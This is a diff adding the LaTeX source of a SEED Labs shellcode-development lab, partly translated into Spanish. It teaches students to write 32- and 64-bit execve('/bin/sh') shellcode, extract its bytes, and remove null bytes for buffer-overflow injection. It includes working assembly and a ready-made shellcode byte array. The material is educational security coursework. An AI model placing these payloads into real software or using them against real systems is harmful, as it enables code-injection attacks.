@@ -1,0 +1,633 @@
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  Copyright by Wenliang Du.                                       %%
+%%  This work is licensed under the Creative Commons                %%
+%%  Attribution-NonCommercial-ShareAlike 4.0 International License. %%
+%%  To view a copy of this license, visit                           %%
+%%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\newcommand{\commonfolder}{../../common-files}
+
+\input{\commonfolder/header}
+\input{\commonfolder/copyright}
+
+
+
+\lhead{\bfseries SEED Labs -- Laboratorio de Desarrollo de Shellcode}
+
+
+\begin{document}
+
+\begin{center}
+{\LARGE Laboratorio de Desarrollo de Shellcode}
+\end{center}
+
+\seedlabcopyright{2020}
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Descripción General}
+
+Un Shellcode es ampliamente usado en muchos ataques que involucran inyección de código. Escribir un shellcode es una tarea desafiante. Aunque podamos encontrar muchos shellcodes en internet de manera fácil, existen situaciones donde tendremos que escribir un shellcode que satisfaga condiciones específicas. De toodas formas tener la capacidad de escribir nuestros propios shellcodes es enriquecedor.
+Existen varias técnicas que involucran escribir un shellcode.
+El propósito de este laboratorio es que los estudiantes entiendan esas técnicas y aprendan a escribir su propio shellcode.
+
+A la hora de escribir un shellcode se presentan varios desafíos, uno de ellos es asegurar que no haya zeros en el binario y el otro es encontrar la dirección en memooria de los datos usados en el comando.
+El primer desafío no es dificíl de resolver y existen muchas formas de hacerlo.
+El segundo desafío puede ser encarado por medio de dos estrategias, la primera es usar los datos que son puestos en el stack durante la ejecución y obtener su dirección de memoria usando el stack pointer. La segunda es guardar los datos en la región del código después de llamar a la instrucción \texttt{call}.
+Cuando la instrucción \texttt{call} es ejecutada, la dirección en memoria de los datos que son pusheados en el stack es tratada como la dirección de retorno.
+Ambas soluciones son eficientes, nuestra esperanza es que los estudiantess puedan aprender estas dos técnicas.
+Este laboratorio cubre los siguientes tópicos:
+
+
+\begin{itemize}[noitemsep]
+\item Shellcode
+\item Ensamblando el Código
+\item Desensamblado 
+\end{itemize}
+
+
+\paragraph{Lecturas y Videos.}
+Para una cobertura más detallada en Shellcode puede consultar
+
+\begin{itemize}
+\item Capítulos 4.7 del libro de SEED, \seedbook
+\item Sección 4 del curso de SEED en Udemy (Lectura 30), \seedcsvideo
+\end{itemize}
+
+
+\paragraph{Lab environment.} \seedenvironmentC
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Tarea 1: Escribiendo un Shellcode}
+
+En esta tarea, empezaremos con un shellcode de ejemplo para demostrar como escribir uno. Después de esto, los estudiantes deberán modificar este shellcode para realizar varias tareas.
+
+Un shellcode es escrito usualmente en lenguaje ensamblador, el cual es dependiente de la arquitectura de la computadora. En este laboratorio se usará la arquitectura Intel, en el cual tenemos dos tipos de procesadores:
+x86 (para 32-bits) y x64 (para 64-bits). En esta tarea nos focalizaremos en un shelllcode de 32-bits y en la tarea final usaremos un shellcode de 64-bitss.
+Aunque la mayoría de las computadores hoy en día son de 64-bit, pueden ejecutar programas de 32-bits.
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Tarea 1.a: El Proceso Completo}
+
+En esta tarea, hemos provisto un shellcode x86 sencillo para mostrar a los estudiantes como escribir un shellcode desde el principioo. Los estudiantes pueden descargarse este código del laboratorio en el sitio oficial.
+El código a usar es mostrado a continuación. \textbf{Nota:} por favor no copie y pegue el código desde este archivo PDF, porque algunos caracteres podrían verse alterados al realizar esta acción. Use directamente el código descargado del sitio oficial.
+
+Si bien en el código se da una breve explicación en los comentarios, los estudiantes pueden encontrar una explicación más detallada en el libro de SEED (Capítulo 4.7) y también en el curso de SEED en Udemy (Lectura 30 del curso de Computer Security).
+
+
+\begin{lstlisting}[caption={A basic shellcode example \texttt{mysh.s}}]
+section .text
+  global _start
+    _start:
+      ; Store the argument string on stack
+      xor  eax, eax
+      push eax          ; Use 0 to terminate the string  
+      push "//sh"       ;                                  (*@\ding{202}@*)
+      push "/bin"
+      mov  ebx, esp     ; Get the string address
+
+      ; Construct the argument array argv[]
+      push eax          ; argv[1] = 0                      (*@\ding{203}@*)
+      push ebx          ; argv[0] points to the cmd string (*@\ding{204}@*)
+      mov  ecx, esp     ; Get the address of argv[]
+
+      ; For environment variable 
+      xor  edx, edx     ; No env variable                  (*@\ding{205}@*)
+
+      ; Invoke execve()
+      xor  eax, eax     ; eax = 0x00000000
+      mov   al, 0x0b    ; eax = 0x0000000b 
+      int 0x80
+\end{lstlisting}
+
+
+\paragraph{Compilando a código objeto.}
+Compilaremos nuestro código en ensamblador (\texttt{mysh.s}) usando \texttt{nasm}, el cual es un ensamblador y desensamblador para las arquitecturas Intel x86 y x64.
+El parámetro \texttt{-f elf32} nos permite compilar el código a un formato de binario ELF de 32-bits. El formato ELF (Executable and Linkable Format) es un formato  archivo para ejecutables, código objeto y librerías compartidas.
+Para usar un binario de 64-bits se deberá usar \texttt{elf64}.
+
+
+\begin{lstlisting}
+$ nasm -f elf32 mysh.s -o mysh.o
+\end{lstlisting}
+
+
+\paragraph{Linkeando al binario.}
+Una vez que tenemos el código objeto \texttt{mysh.o}, procederemos al último paso. Debemos de generar el binario ejecutable, para esto debemos de usar el programa de linkeo o linker \texttt{ld}. El parámetro \texttt{-m elf\_i386} nos permite generar un binario ELF de 32-bits.
+Después de esto, tendremos nuestro código ejecutable \texttt{mysh}. Si lo ejecutamos podremos tener una shell.
+Antes y después de correr \texttt{mysh}, mostramos en pantalla el ID del proceso actual de la shell usando \texttt{echo \$\$}, a través de estos mensajes podemos observar como la ejecución de \texttt{mysh} genera un nueva shell en un nuevo proceso.
+
+\begin{lstlisting}
+$ ld -m elf_i386 mysh.o -o mysh
+
+$ echo $$
+25751    (*@\reflectbox{\ding{217}} the process ID of the current shell@*)
+$ mysh
+$ echo $$
+9760     (*@\reflectbox{\ding{217}} the process ID of the new shell@*)
+\end{lstlisting}
+
+
+
+\paragraph{Obteniendo el código máquina.}
+During the attack, we only need the machine code 
+of the shellcode, not a standalone executable file, which
+contains data other than the actual machine code. 
+Technically, only the machine code is called shellcode. 
+Therefore, we need to extract the machine
+code from the executable file or the object file.
+There are various ways to do that. One way is to 
+use the \texttt{objdump} command to disassemble the 
+executable or object file. 
+
+There are two different common syntax modes for assembly code, 
+one is the AT\&T syntax mode, and the other is 
+Intel syntax mode. By default, \texttt{objdump} uses
+the AT\&T mode. In the following, 
+we use the \texttt{-Mintel} option to 
+produce the assembly code in the Intel mode. 
+
+\begin{lstlisting}
+$ objdump -Mintel --disassemble mysh.o
+mysh.o:     file format elf32-i386
+
+Disassembly of section .text:
+
+00000000 <_start>:
+   0:	(*@\textbf{31 db}@*)    xor    ebx,ebx
+   2:	(*@\textbf{31 c0}@*)    xor    eax,eax
+            ... (code omitted) ...
+  1f:	(*@\textbf{b0 0b}@*)    mov    al,0xb
+  21:	(*@\textbf{cd 80}@*)    int    0x80
+\end{lstlisting}
+ 
+In the above printout, the highlighted numbers are machine code.
+You can also use the \texttt{xxd} command to print out 
+the content of the binary file, and you should be 
+able to find out the shellcode's machine
+code from the printout.
+
+\begin{lstlisting}
+$ xxd -p -c 20 mysh.o
+7f454c4601010100000000000000000001000300
+...
+000000000000000000000000(*@\textbf{31db31c0b0d5cd80}@*)
+(*@\textbf{31c050682f2f7368682f62696e89e3505389e131}@*)
+(*@\textbf{d231c0b00bcd80}@*)00000000000000000000000000
+...
+\end{lstlisting}
+ 
+
+\paragraph{Usando el shellcode para atacar al código.}
+In actual attacks, we need to include the shellcode
+in our attacking code, such as a Python or C program.
+We usually store the machine code in an array, but
+converting the machine code printed above 
+to the array assignment in Python and C programs
+is quite tedious if done manually, especially if 
+we need to perform this process many times in the lab. 
+We wrote the following Python code to
+help this process. Just copy whatever you
+get from the \texttt{xxd} command (only the shellcode part)
+and paste it to the following code, between the lines
+marked by \texttt{"""}. The code can be downloaded from the 
+lab's website.
+
+
+\begin{lstlisting}[caption=\texttt{convert.py}] 
+#!/usr/bin/env python3
+
+# Run "xxd -p -c 20 mysh.o", and
+# copy and paste the machine code part to the following:
+ori_sh ="""
+31db31c0b0d5cd80
+31c050682f2f7368682f62696e89e3505389e131
+d231c0b00bcd80
+"""
+
+sh = ori_sh.replace("\n", "")
+
+length  = int(len(sh)/2)
+print("Length of the shellcode: {}".format(length))
+s = 'shellcode= (\n' + '   "'
+for i in range(length):
+    s += "\\x" + sh[2*i] + sh[2*i+1]
+    if i > 0 and i % 16 == 15:
+       s += '"\n' + '   "'
+s += '"\n' + ").encode('latin-1')"
+print(s)
+\end{lstlisting}
+ 
+The \texttt{convert.py} program will print out the 
+following Python code that you can include 
+in your attack code. It stores the shellcode in
+a Python array. 
+ 
+\begin{lstlisting}
+$ ./convert.py
+Length of the shellcode: 35
+shellcode= (
+   "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+   "\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0"
+   "\x0b\xcd\x80"
+).encode('latin-1')
+\end{lstlisting}
+
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Tarea 1.b. Eliminando los Ceros del Código}
+
+Shellcode is widely used in buffer-overflow attacks. In many 
+cases, the vulnerabilities are caused by string copy, such
+as the \texttt{strcpy()} function. For these string copy functions,
+zero is considered as the end of the string. Therefore, if we have 
+a zero in the middle of a shellcode, string copy will not be able to
+copy anything after the zero from this shellcode to the target 
+buffer, so the attack will not be able to succeed. 
+
+Although not all the vulnerabilities have issues with zeros, 
+it becomes a requirement for shellcode not to have any zero in
+the machine code; otherwise, the application of a shellcode 
+will be limited. 
+
+There are many techniques that can get rid of zeros 
+from the shellcode. The code \texttt{mysh.s} needs to 
+use zeros in four different places. Please identify all
+of those places, and explain how the code uses zeros
+but without introducing zero in the code. Some hints 
+are given in the following:
+
+
+\begin{itemize}
+\item If we want to assign zero to \texttt{eax}, we 
+can use \texttt{"mov eax, 0"}, but doing so,
+we will get a zero in the machine code. A typical way
+to solve this problem is to use \texttt{"xor eax, eax"}. 
+Please explain why this would work.
+
+\item If we want to store \texttt{0x00000099} to
+\texttt{eax}. We cannot just use \texttt{mov eax, 0x99}, because 
+the second operand is actually \texttt{0x00000099}, which contains three zeros. 
+To solve this problem, we can first set \texttt{eax} to zero, and then
+assign a one-byte number \texttt{0x99} to the \texttt{al} register, which 
+is the least significant 8 bits of the \texttt{eax} register. 
+
+
+\item Another way is to use shift. In the following code,
+first \texttt{0x237A7978} is assigned to \texttt{ebx}.
+The ASCII values for \texttt{x}, \texttt{y}, \texttt{z}, and \texttt{\#} are 
+\texttt{0x78}, \texttt{0x79}, \texttt{0x7a}, \texttt{0x23}, 
+respectively. Because most Intel CPUs use the small-Endian byte order,
+the least significant byte is the one stored at the lower address (i.e., the
+character \texttt{x}), so the number presented by \texttt{xyz\#} is 
+actually \texttt{0x237A7978}. You can see this when you dissemble the 
+code using \texttt{objdump}. 
+
+After assigning the number to \texttt{ebx},  
+we shift this register to the left 
+for 8 bits, so the most significant byte \texttt{0x23} will 
+be pushed out and discarded. 
+We then shift the register to the right for 8 bits,
+so the most significant byte will be filled with \texttt{0x00}. 
+After that, \texttt{ebx} will contain \texttt{0x007A7978}, 
+which is equivalent to \texttt{"xyz\textbackslash 0"}, i.e., the last
+byte of this string becomes zero. 
+
+\begin{lstlisting}
+mov  ebx, "xyz#"
+shl  ebx, 8
+shr  ebx, 8
+\end{lstlisting}
+\end{itemize}
+
+
+\paragraph{Task.}
+In Line \ding{202} of the shellcode \texttt{mysh.s}, 
+we push \texttt{"//sh"} into the stack. Actually, we 
+just want to push \texttt{"/sh"} into the stack, but 
+the \texttt{push} instruction has to push a 32-bit number.
+Therefore, we add a redundant \texttt{/} at the beginning; 
+for the OS, this is equivalent to just one single \texttt{/}.  
+
+
+For this task, we will use the shellcode to execute
+\texttt{/bin/bash}, which has 9 bytes in the command string (10 bytes if 
+counting the zero at the end). Typically, to push
+this string to the stack, we need to make the length
+multiple of 4, so we would convert the string
+to \texttt{/bin////bash}. 
+
+However, for this task,   
+you are not allowed to add any
+redundant \texttt{/} to the string, i.e., the length of the 
+command must be 9 bytes (\texttt{/bin/bash}).
+Please demonstrate how you can do that.
+In addition to showing that you can get a bash shell, you also
+need to show that there is no zero in your code. 
+
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Task 1.c. Providing Arguments for System Calls}
+ 
+Inside \texttt{mysh.s}, in Lines \ding{203} and \ding{204},
+we construct the \texttt{argv[]} array for the 
+\texttt{execve()} system call. Since 
+our command is \texttt{/bin/sh}, without any command-line
+arguments, our \texttt{argv} array only contains 
+two elements: the first one is a pointer to 
+the command string, and the second one is zero. 
+
+In this task, we need to run the 
+following command, i.e., we want to use 
+\texttt{execve} to execute the following command, which
+uses \texttt{/bin/sh} to execute the \texttt{"ls -la"}
+command. 
+
+\begin{lstlisting}
+/bin/sh -c "ls -la"
+\end{lstlisting}
+
+In this new command, the \texttt{argv} array should have 
+the following four elements, all of which need to be 
+constructed on the stack. Please modify \texttt{mysh.s} and 
+demonstrate your execution result. As usual, you cannot have 
+zero in your shellcode (you are allowed to use redundant /). 
+
+\begin{lstlisting}
+argv[3] = 0
+argv[2] = "ls -la"
+argv[1] = "-c"
+argv[0] = "/bin/sh"
+\end{lstlisting}
+ 
+
+
+% -------------------------------------------
+% SUBSECTION
+% ------------------------------------------- 
+\subsection{Task 1.d. Providing Environment Variables for \texttt{execve()}}
+
+The third parameter for the \texttt{execve()} system call
+is a pointer to the environment variable array, and it allows 
+us to pass environment variables to the program. In our 
+sample program (Line \ding{205}), we
+pass a null pointer to \texttt{execve()}, so
+no environment variable is passed to the program. 
+In this task, we will pass some environment variables. 
+
+If we change the command \texttt{"/bin/sh"} in our shellcode
+\texttt{mysh.s} to \texttt{"/usr/bin/env"}, which is a command to print out the 
+environment variables. You can find out that when we run
+our shellcode, there will be no output, because our 
+process does not have any environment variable.
+
+
+In this task, we will write a shellcode called \texttt{myenv.s}. When this 
+program is executed, it executes the \texttt{"/usr/bin/env"} command, which
+can print out the following environment variables: 
+
+\begin{lstlisting}
+$ ./myenv
+aaa=1234
+bbb=5678
+cccc=1234
+\end{lstlisting}
+
+It should be noted that the value for the environment variable \texttt{cccc}
+must be exactly 4 bytes (no space is allowed to be added to the tail).
+We intentionally make the length of this environment variable string (name and value)
+not multiple of 4.
+
+
+To write such a shellcode, we need to construct an
+environment variable array on the stack, 
+and store the address of this array to the \texttt{edx} register,  
+before invoking \texttt{execve()}.  
+The way to construct this array on the stack is exactly the same
+as the way how we construct the \texttt{argv[]} array. Basically,
+we first store the actual environment variable strings on the stack.
+Each string has a format of \texttt{name=value}, and it is terminated by
+a zero byte. We need to get the addresses of these 
+strings. Then, we construct the 
+environment variable array, also on the stack, and store the 
+addresses of the strings in this array.  
+The array should look like the following (the order of 
+the elements \texttt{0}, \texttt{1}, and \texttt{2} does not matter): 
+
+\begin{lstlisting}
+env[3] = 0   // 0 marks the end of the array
+env[2] = address to the "cccc=1234" string
+env[1] = address to the "bbb=5678"  string
+env[0] = address to the "aaa=1234"  string
+\end{lstlisting}
+
+
+
+
+
+
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Task 2: Using Code Segment}
+
+As we can see from the shellcode in Task 1, 
+the way how it solves the data address problem is that 
+it dynamically constructs all the necessary 
+data structures on the stack,
+so their addresses can be obtained from the 
+stack pointer \texttt{esp}.
+
+There is another approach to solve the same problem,
+i.e., getting the address of all the necessary
+data structures. In this approach, data are stored in the code
+region, and its address is obtained 
+via the function call mechanism. Let's look at the following
+code. 
+
+\begin{lstlisting}[caption={\texttt{mysh2.s}}]
+section .text
+  global _start
+    _start:
+        BITS 32
+        jmp short two
+    one:
+        pop ebx                   (*@\ding{202}@*)
+        xor eax, eax
+        mov [ebx+7],  al  ; save 0x00 (1 byte) to memory at address ebx+7
+        mov [ebx+8],  ebx ; save ebx (4 bytes) to memory at address ebx+8
+        mov [ebx+12], eax ; save eax (4 bytes) to memory at address ebx+12
+        lea ecx, [ebx+8]  ; let ecx = ebx + 8
+        xor edx, edx
+        mov al,  0x0b
+        int 0x80
+     two:
+        call one
+        db '/bin/sh*AAAABBBB' ;  (*@\ding{203}@*)
+\end{lstlisting}
+
+The code above first jumps to the instruction at 
+location \texttt{two}, which does another 
+jump (to location \texttt{one}), but this time,
+it uses the \texttt{call} instruction.  This instruction 
+is for function call, i.e., before it jumps to
+the target location, it keeps a record of the address
+of the next instruction as the return address, so when
+the function returns, it can return to the 
+instruction right after the \texttt{call} instruction.  
+
+In this example, the ``instruction'' right after the 
+\texttt{call} instruction (Line \ding{203}) is not actually an instruction; 
+it stores a string. However, this does not matter, the
+\texttt{call} instruction will push its address (i.e.,
+the string's address) into the stack, in the return
+address field of the function frame. When we 
+get into the function, i.e., after jumping to 
+location \texttt{one}, the top of the stack 
+is where the return address is stored. Therefore,
+the \texttt{pop ebx} instruction in Line \ding{202} actually
+get the address of the string on Line \ding{203}, 
+and save it to the \texttt{ebx} register. That is how the 
+address of the string is obtained. 
+
+
+The string at Line \ding{203} is not a completed string; it 
+is just a place holder. 
+The program needs to construct the needed data structure
+inside this place holder. Since the address of the string
+is already obtained, the address of all the data 
+structures constructed inside this place holder can
+be easily derived. 
+
+
+If we want to get an executable, we need to use 
+the \texttt{--omagic} option when running the 
+linker program (\texttt{ld}), so 
+the code segment is writable. 
+By default, the code segment is not writable.
+When this program runs, it needs to modify the data stored
+in the code region; if the code segment is not 
+writable, the program will crash. 
+This is not a problem for actual attacks, because
+in attacks, the code is typically injected into a writable data 
+segment (e.g. stack or heap). Usually we do not run shellcode 
+as a standalone program. 
+
+
+\begin{lstlisting}
+$ nasm -f elf32 mysh2.s -o mysh2.o
+$ ld --omagic -m elf_i386 mysh2.o -o mysh2
+\end{lstlisting}
+
+
+\paragraph{Tasks.} You need to do the followings:
+(1) Please provide a detailed explanation for each line of the 
+code in \texttt{mysh2.s}, starting from the line labeled \texttt{one}.
+Please explain why this code would successfully execute 
+the \texttt{/bin/sh} program, how the \texttt{argv[]} array is
+constructed, etc. 
+(2) Please use the technique from \texttt{mysh2.s} to 
+implement a new shellcode, so it 
+executes \texttt{/usr/bin/env}, and it prints out 
+the following environment variables: 
+
+\begin{lstlisting}
+a=11
+b=22
+\end{lstlisting}
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Task 3: Writing 64-bit Shellcode}
+
+Once we know how to write the 32-bit shellcode, writing 64-bit
+shellcode will not be difficult, because they are quite similar;
+the differences are mainly in the registers. 
+For the x64 architecture, invoking system call is done through
+the \texttt{syscall} instruction, and the first three arguments 
+for the system call are stored in the \texttt{rdx}, \texttt{rsi}, 
+\texttt{rdi} registers, respectively. 
+The following is an example of 64-bit shellcode:
+
+\begin{lstlisting}[caption={A 64-bit shellcode \texttt{mysh\_64.s}}]
+  section .text
+  global _start
+    _start:
+      ; The following code calls execve("/bin/sh", ...)
+      xor  rdx, rdx       ; 3rd argument (stored in rdx)
+      push rdx
+      mov rax,'/bin//sh'  
+      push rax
+      mov rdi, rsp        ; 1st argument (stored in rdi)
+      push rdx
+      push rdi
+      mov rsi, rsp        ; 2nd argument (stored in rsi)
+      xor  rax, rax
+      mov al, 0x3b        ; execve()
+      syscall
+\end{lstlisting}
+
+We can use the following commands to compile the assemble code into
+64-bit binary code: 
+
+\begin{lstlisting}
+$ nasm -f elf64 mysh_64.s -o mysh_64.o
+$ ld mysh_64.o -o mysh_64
+\end{lstlisting}
+
+\paragraph{Task.}
+Repeat Task 1.b for this 64-bit shellcode. Namely, 
+instead of executing \texttt{"/bin/sh"}, we need to execute
+\texttt{"/bin/bash"}, and we are not allowed to use
+any redundant \texttt{/} in the command string, 
+i.e., the length of the command must be 9 bytes (\texttt{/bin/bash}).
+Please demonstrate how you can do that.
+In addition to showing that you can get a bash shell, you also
+need to show that there is no zero in your code. 
+
+% *******************************************
+% SECTION
+% *******************************************
+\section{Submission}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\input{\commonfolder/submission}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+% *******************************************
+% SECTION
+% *******************************************
+\section*{Agradecimientos}
+
+\input{\commonfolder/acknowledgments}
+
+
+\end{document}
+
+
+
+
+
+
+
